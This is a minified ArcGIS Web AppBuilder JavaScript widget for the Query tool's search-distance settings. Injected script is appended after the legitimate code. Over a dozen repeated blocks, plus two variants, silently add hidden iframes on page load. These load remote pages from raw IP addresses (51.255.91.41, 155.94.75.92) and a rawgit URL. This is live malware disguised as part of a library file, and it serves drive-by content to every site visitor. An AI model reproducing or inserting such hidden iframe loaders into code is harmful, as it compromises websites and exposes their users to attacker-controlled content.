// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Query/setting/SearchDistance.html":'\x3cdiv\x3e\r\n\t\x3ctable style\x3d"table-layout:fixed;"\x3e\r\n\t\t\x3ccolgroup\x3e\r\n\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\x3ccol width\x3d"15px"\x3e\x3c/col\x3e\r\n\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\x3c/colgroup\x3e\r\n\t\t\x3ctbody\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd style\x3d"padding-bottom:5px;"\x3e${nls.defaultDistance}\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e${nls.defaultUnit}\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"numberTextBox" data-dojo-type\x3d"dijit/form/NumberTextBox"\r\n\t\t\t\t\t data-dojo-props\x3d\'"required":true,intermediateChanges:true,constraints:{min:0,pattern:"#####0.##########"}\'\r\n\t\t\t\t\t style\x3d"width:100%;" /\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3cselect data-dojo-type\x3d"dijit/form/Select" class\x3d"restrict-select-width" data-dojo-attach-point\x3d"defaultUnitSelect" style\x3d"width:100%;"\x3e\r\n\t\t\t\t\t\t\x3coption value\x3d"MILES" selected\x3e${nls.miles}\x3c/option\x3e\r\n\t\t\t\t\t\t\x3coption value\x3d"KILOMETERS"\x3e${nls.kilometers}\x3c/option\x3e\r\n\t\t\t\t\t\t\x3coption value\x3d"FEET"\x3e${nls.feet}\x3c/option\x3e\r\n\t\t\t\t\t\t\x3coption value\x3d"METERS"\x3e${nls.meters}\x3c/option\x3e\r\n\t\t\t\t\t\t\x3coption value\x3d"YARDS"\x3e${nls.yards}\x3c/option\x3e\r\n\t\t\t\t\t\t\x3coption value\x3d"NAUTICAL_MILES"\x3e${nls.nauticalMiles}\x3c/option\x3e\r\n\t\t\t\t\t\x3c/select\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\x3c/tbody\x3e\r\n\t\x3c/table\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./SearchDistance.html dojo/_base/lang jimu/utils dijit/form/Select dijit/form/NumberTextBox".split(" "),function(b,c,d,e,f,g,h){return b([c,d,e],{baseClass:"jimu-query-setting-searchdistance",templateString:f,_allUnitInfos:null,nls:null,config:null,postCreate:function(){this.inherited(arguments);this.reset();this.config&&this.setConfig(this.config)},setConfig:function(a){this.reset();this.config=
g.clone(a);this.numberTextBox.set("value",this.config.defaultDistance);this.defaultUnitSelect.set("value",this.config.defaultUnit)},getConfig:function(){var a={defaultDistance:0,defaultUnit:""};if(this.numberTextBox.validate())return a.defaultDistance=this.numberTextBox.get("value"),a.defaultUnit=this.defaultUnitSelect.get("value"),a;h.showValidationErrorTipForFormDijit(this.numberTextBox)},reset:function(){this.numberTextBox.set("value",0);this.defaultUnitSelect.set("value","MILES")},enable:function(){this.numberTextBox.set("disabled",
!1);this.defaultUnitSelect.set("disabled",!1)},disable:function(){this.numberTextBox.set("disabled",!0);this.defaultUnitSelect.set("disabled",!0)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});